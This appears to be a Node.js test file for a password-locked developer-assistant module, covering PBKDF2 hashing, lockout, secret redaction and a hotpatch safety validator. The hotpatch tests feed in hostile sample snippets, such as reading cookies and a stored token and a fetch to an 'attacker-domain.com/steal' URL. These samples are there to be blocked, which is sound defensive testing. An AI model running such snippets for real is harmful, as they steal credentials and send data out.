// Unit & Integration Tests for Dev Assistant, Cryptographic Lock, Error Logger & Hotpatch Safe Mode
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const crypto = require('node:crypto');

console.log('====================================================');
console.log('🧪 TESTING DEV ASSISTANT, CRYPTO & SELF-HEALING ENGINE');
console.log('====================================================\n');

let passed = 0;
let failed = 0;

function assert(condition, testName, detail = '') {
  if (condition) {
    console.log(`✅ PASS: ${testName}`);
    passed++;
  } else {
    console.error(`❌ FAIL: ${testName} - ${detail}`);
    failed++;
  }
}

const PUBLIC_DIR = path.join(__dirname, 'public');
const devAssistantCode = fs.readFileSync(path.join(PUBLIC_DIR, 'js', 'dev-assistant.js'), 'utf-8');

(async () => {
  // -------------------------------------------------------------------------
  // MOCK ENVIRONMENT
  // -------------------------------------------------------------------------
  const mockLocalStorage = {};
  const mockEventListeners = {};

  const mockElements = {
    devProblemInput: { value: '' },
    btnDevProblemMic: { addEventListener: () => {}, textContent: '🎙️' },
    btnDevRunFullCheck: { addEventListener: () => {}, disabled: false, textContent: '' },
    btnDevDiagnose: { addEventListener: () => {}, disabled: false, textContent: '' },
    btnDevApplyHotpatch: { addEventListener: () => {}, style: {} },
    btnDevRejectHotpatch: { addEventListener: () => {}, style: {} },
    btnDevUndoAllPatches: { addEventListener: () => {} },
    btnDevChangePwd: { addEventListener: () => {} },
    devDiagnosticsGrid: { innerHTML: '' },
    devFixProposalCard: { style: {} },
    devFixCauseText: { textContent: '' },
    devFixSummaryText: { textContent: '' },
    devFixCodeContainer: { style: {} },
    devFixCodePreview: { textContent: '' },
    devFixNativeContainer: { style: {} },
    devFixNativeSteps: { textContent: '' },
    devPatchHistoryList: { innerHTML: '' },
    devStudioPinModal: { style: {} }
  };

  const sandbox = {
    console,
    Date,
    Math,
    parseInt,
    setTimeout,
    clearTimeout,
    Int32Array,
    Uint8Array,
    TextEncoder: typeof TextEncoder !== 'undefined' ? TextEncoder : undefined,
    crypto: crypto.webcrypto,
    localStorage: {
      getItem: (k) => mockLocalStorage[k] || null,
      setItem: (k, v) => { mockLocalStorage[k] = String(v); },
      removeItem: (k) => { delete mockLocalStorage[k]; }
    },
    document: {
      getElementById: (id) => mockElements[id] || null,
      addEventListener: (evt, fn) => {
        mockEventListeners[evt] = fn;
      },
      head: {
        appendChild: () => {}
      },
      createElement: (tag) => ({
        id: '',
        textContent: '',
        remove: () => {},
        captureStream: () => ({})
      })
    },
    window: {
      addEventListener: (evt, fn) => {
        mockEventListeners[evt] = fn;
      },
      speechSynthesis: {
        cancel: () => {},
        speak: () => {},
        getVoices: () => [{ lang: 'hi-IN', name: 'Hindi Female' }]
      },
      SpeechRecognition: function() {},
      app: {
        activeTab: 'chat',
        switchTab: (t) => { sandbox.window.app.activeTab = t; },
        showToast: () => {}
      },
      soundFX: {
        click: () => {},
        success: () => {},
        error: () => {}
      }
    },
    navigator: {
      onLine: true
    },
    MediaRecorder: {
      isTypeSupported: () => true
    }
  };
  sandbox.window.localStorage = sandbox.localStorage;
  sandbox.window.document = sandbox.document;
  sandbox.window.crypto = crypto.webcrypto;
  sandbox.window.navigator = sandbox.navigator;

  vm.createContext(sandbox);
  vm.runInContext(devAssistantCode, sandbox);

  const DevAssistant = sandbox.window.DevAssistant;
  assert(DevAssistant !== undefined, 'DevAssistant global controller initialized');
  assert(typeof sandbox.window.computePBKDF2 === 'function', 'computePBKDF2 function exported');
  assert(typeof sandbox.window.constantTimeCompare === 'function', 'constantTimeCompare function exported');

  // =========================================================================
  // 1. CRYPTO & CONSTANT TIME COMPARISON TESTS
  // =========================================================================
  const testSaltHex = '4d91a8b5fdfd3dda5b4b7c5318b38952';
  const testPassword = 'SecretDevTestPassword#2026';

  // Compute reference hash using Node built-in crypto
  const referenceHash = crypto.pbkdf2Sync(testPassword, Buffer.from(testSaltHex, 'hex'), 1000, 32, 'sha256').toString('hex');
  const jsComputedHash = await sandbox.window.computePBKDF2(testPassword, testSaltHex, 1000, 32);

  assert(jsComputedHash === referenceHash, 'Pure JS PBKDF2 matches Node crypto byte-for-byte');

  // Constant-time comparison
  assert(sandbox.window.constantTimeCompare('abcd1234ef', 'abcd1234ef') === true, 'constantTimeCompare matches equal strings');
  assert(sandbox.window.constantTimeCompare('abcd1234ef', 'abcd1234ee') === false, 'constantTimeCompare detects single-bit difference');
  assert(sandbox.window.constantTimeCompare('abcd', 'abcdef') === false, 'constantTimeCompare handles different lengths');

  // =========================================================================
  // 2. PASSWORD UNLOCK, WRONG ATTEMPTS & 5-ATTEMPT LOCKOUT
  // =========================================================================
  // Configure DevAssistant with test salt & 100k iteration hash
  const test100kHash = crypto.pbkdf2Sync(testPassword, Buffer.from(testSaltHex, 'hex'), 100000, 32, 'sha256').toString('hex');
  mockLocalStorage['jarvis_dev_pwd_salt'] = testSaltHex;
  mockLocalStorage['jarvis_dev_pwd_hash'] = test100kHash;
  mockLocalStorage['jarvis_dev_fail_count'] = '0';
  mockLocalStorage['jarvis_dev_lockout_until'] = '0';

  // Wrong password
  const fail1 = await DevAssistant.checkPasswordUnlock('wrongPass1');
  assert(fail1 === false, 'Wrong password attempt rejected');
  assert(mockLocalStorage['jarvis_dev_fail_count'] === '1', 'Failed attempt incremented fail counter');

  // Next 4 wrong attempts to hit limit of 5
  await DevAssistant.checkPasswordUnlock('wrongPass2');
  await DevAssistant.checkPasswordUnlock('wrongPass3');
  await DevAssistant.checkPasswordUnlock('wrongPass4');
  await DevAssistant.checkPasswordUnlock('wrongPass5');

  assert(parseInt(mockLocalStorage['jarvis_dev_fail_count'], 10) >= 5, 'Fail counter reached 5');
  const lockoutUntil = parseInt(mockLocalStorage['jarvis_dev_lockout_until'], 10);
  assert(lockoutUntil > Date.now(), '5 failed attempts triggered 5-minute lockout timestamp');

  // Attempt during lockout should be rejected immediately even with correct password
  const lockedAttempt = await DevAssistant.checkPasswordUnlock(testPassword);
  assert(lockedAttempt === false, 'Attempt during active lockout period is blocked');

  // Reset lockout for test
  mockLocalStorage['jarvis_dev_lockout_until'] = '0';
  mockLocalStorage['jarvis_dev_fail_count'] = '0';

  // Successful unlock
  const unlockSuccess = await DevAssistant.checkPasswordUnlock(testPassword);
  assert(unlockSuccess === true, 'Correct password successfully unlocks Dev Assistant');
  assert(DevAssistant.isUnlocked === true, 'DevAssistant.isUnlocked flag is true');
  assert(sandbox.window.app.activeTab === 'developer', 'Unlocking automatically opens developer tab screen');
  assert(mockLocalStorage['jarvis_dev_fail_count'] === '0', 'Successful unlock resets fail count to 0');

  // Inactivity / Visibility Lock
  DevAssistant.lock();
  assert(DevAssistant.isUnlocked === false, 'DevAssistant.lock() locks session');

  // =========================================================================
  // 3. CHAT INTERCEPTION VERIFICATION
  // =========================================================================
  let chatSentToAi = false;
  let chatLoggedToHistory = false;

  const mockChatHandler = async (message) => {
    // Intercept check
    if (message && DevAssistant && typeof DevAssistant.checkPasswordUnlock === 'function') {
      const isUnlock = await DevAssistant.checkPasswordUnlock(message);
      if (isUnlock) {
        return { intercepted: true };
      }
    }
    chatSentToAi = true;
    chatLoggedToHistory = true;
    return { intercepted: false };
  };

  // Typing normal text
  const resNormal = await mockChatHandler('नमस्ते, तुम कैसी हो?');
  assert(resNormal.intercepted === false && chatSentToAi === true, 'Normal message proceeds to AI normally');

  // Typing password in chat
  chatSentToAi = false;
  chatLoggedToHistory = false;
  const resSecret = await mockChatHandler(testPassword);
  assert(resSecret.intercepted === true, 'Secret password intercepted before sending');
  assert(chatSentToAi === false, 'Secret password is NOT sent to AI');
  assert(chatLoggedToHistory === false, 'Secret password is NOT saved to chat history');
  assert(DevAssistant.isUnlocked === true, 'Dev Assistant unlocked via chat input');

  // =========================================================================
  // 4. RUNTIME ERROR LOGGER TESTS (CIRCULAR BUFFER 200)
  // =========================================================================
  const logger = DevAssistant.logger;
  assert(logger !== undefined, 'Logger instance is active');

  // Log 250 items to verify 200 circular buffer cap
  for (let i = 0; i < 250; i++) {
    logger.addLog({ type: 'test_error', msg: `Error item ${i}` });
  }
  assert(logger.logs.length === 200, 'Logger maintains circular buffer max 200 entries');
  assert(logger.logs[0].msg === 'Error item 249', 'Latest log is preserved at head of buffer');

  // =========================================================================
  // 5. FULL SYSTEM CHECK (DIAGNOSTICS)
  // =========================================================================
  const fullCheck = await DevAssistant.runFullCheck();
  assert(typeof fullCheck === 'object', 'runFullCheck returns object');
  assert(fullCheck.video && fullCheck.video.ok === true, 'Diagnostics: Video & MediaRecorder check passed');
  assert(fullCheck.voice && fullCheck.voice.ok === true, 'Diagnostics: Voice & Speech check passed');
  assert(fullCheck.storage && fullCheck.storage.ok === true, 'Diagnostics: Storage check passed');
  assert(fullCheck.network && fullCheck.network.ok === true, 'Diagnostics: Network check passed');

  // =========================================================================
  // 6. SENSITIVE DATA REDACTION SANITIZER
  // =========================================================================
  const rawData = {
    apiKey: 'AIzaSyDemoFakeApiKeyForTestingRedact12',
    hfToken: 'hf_abcdef1234567890abcdef123456789012',
    salt: '4d91a8b5fdfd3dda5b4b7c5318b38952',
    hash: 'ff8f936e3bfebef2e39be862208cdeeb7157adfd39265202ffc8c4a2ad5a5498',
    userChat: 'मेरा नाम राहुल है और यह निजी बातचीत है'
  };

  const redacted = sandbox.window.redactSensitiveData(rawData);
  assert(redacted.apiKey === '[REDACTED_GEMINI_KEY]', 'Redactor sanitizes Gemini API Key');
  assert(redacted.hfToken === '[REDACTED_HF_TOKEN]', 'Redactor sanitizes Hugging Face Token');
  assert(!JSON.stringify(redacted).includes('4d91a8b5fdfd3dda5b4b7c5318b38952'), 'Redactor sanitizes salt');
  assert(!JSON.stringify(redacted).includes('ff8f936e3bfebef2e39be862208cdeeb7157adfd39265202ffc8c4a2ad5a5498'), 'Redactor sanitizes password hash');

  // =========================================================================
  // 7. HOTPATCH SECURITY VALIDATION
  // =========================================================================
  const validateHotpatch = sandbox.window.validateHotpatch;

  // Safe patch
  const safePatch = validateHotpatch(
    'console.log("Fix applied"); document.body.classList.add("patched");',
    '.custom-style { color: red; }'
  );
  assert(safePatch.safe === true, 'Safe hotpatch passes validation');

  // Dangerous eval
  const dangerousEval = validateHotpatch('eval("maliciousCode()");', '');
  assert(dangerousEval.safe === false && dangerousEval.error.includes('eval()'), 'Security check blocks eval()');

  // Dangerous document.cookie
  const dangerousCookie = validateHotpatch('const c = document.cookie;', '');
  assert(dangerousCookie.safe === false && dangerousCookie.error.includes('document.cookie'), 'Security check blocks document.cookie');

  // Dangerous credential theft
  const dangerousTheft = validateHotpatch('const t = localStorage.getItem("hf_token");', '');
  assert(dangerousTheft.safe === false && dangerousTheft.error.includes('Sensitive credentials'), 'Security check blocks reading secret credentials');

  // Dangerous external unauthorized domain
  const dangerousFetch = validateHotpatch('fetch("https://attacker-domain.com/steal")', '');
  assert(dangerousFetch.safe === false && dangerousFetch.error.includes('allowlist'), 'Security check blocks unauthorized network domains');

  // Excessive size (> 20 KB)
  const hugeCode = 'a'.repeat(21 * 1024);
  const oversizedPatch = validateHotpatch(hugeCode, '');
  assert(oversizedPatch.safe === false && oversizedPatch.error.includes('20 KB'), 'Security check blocks patches > 20 KB');

  // =========================================================================
  // 8. HOTPATCH APPLICATION, UNDO & SAFE MODE
  // =========================================================================
  mockLocalStorage['jarvis_hotpatches'] = '[]';

  DevAssistant.pendingHotpatch = {
    cause: 'Video stage styling adjustment',
    fix_type: 'hotpatch',
    explanation: 'Adds subtle glowing border to stage',
    patch: {
      js: 'console.log("Patch 001 executed");',
      css: '.video-stage { box-shadow: 0 0 10px pink; }'
    }
  };

  const applied = DevAssistant.applyPendingHotpatch();
  assert(applied.id === 'patch_001', 'Hotpatch generated with ID patch_001');
  assert(mockLocalStorage['jarvis_canary_patch_id'] === 'patch_001', 'Canary deployed for Safe Mode monitoring');

  const patchesInStorage = JSON.parse(mockLocalStorage['jarvis_hotpatches']);
  assert(patchesInStorage.length === 1 && patchesInStorage[0].active === true, 'Patch saved as active in storage');

  // Undo specific patch
  const undoRes = DevAssistant.undoPatch('patch_001');
  assert(undoRes === true, 'undoPatch successfully reverted patch_001');
  const patchesAfterUndo = JSON.parse(mockLocalStorage['jarvis_hotpatches']);
  assert(patchesAfterUndo[0].active === false, 'Reverted patch marked as inactive');

  // Safe Mode canary trigger
  mockLocalStorage['jarvis_canary_patch_id'] = 'patch_001';
  mockLocalStorage['jarvis_canary_patch_time'] = String(Date.now() - 2000); // 2s ago
  DevAssistant.checkSafeModeCanary(true);
  assert(!mockLocalStorage['jarvis_canary_patch_id'], 'Safe mode cleared failing canary patch');

  // =========================================================================
  // 9. VOICE COMMAND RECOGNITION
  // =========================================================================
  let checkCalled = false;
  DevAssistant.runFullCheck = async () => { checkCalled = true; return fullCheck; };
  DevAssistant.handleVoiceCommand('कृपया सिस्टम चेक करो');
  assert(checkCalled === true, 'Voice command "चेक करो" triggers Full Check');

  console.log('\n====================================================');
  console.log(`📊 DEV ASSISTANT TEST SUMMARY: ${passed} PASSED | ${failed} FAILED`);
  console.log('====================================================\n');

  process.exit(failed > 0 ? 1 : 0);
})();
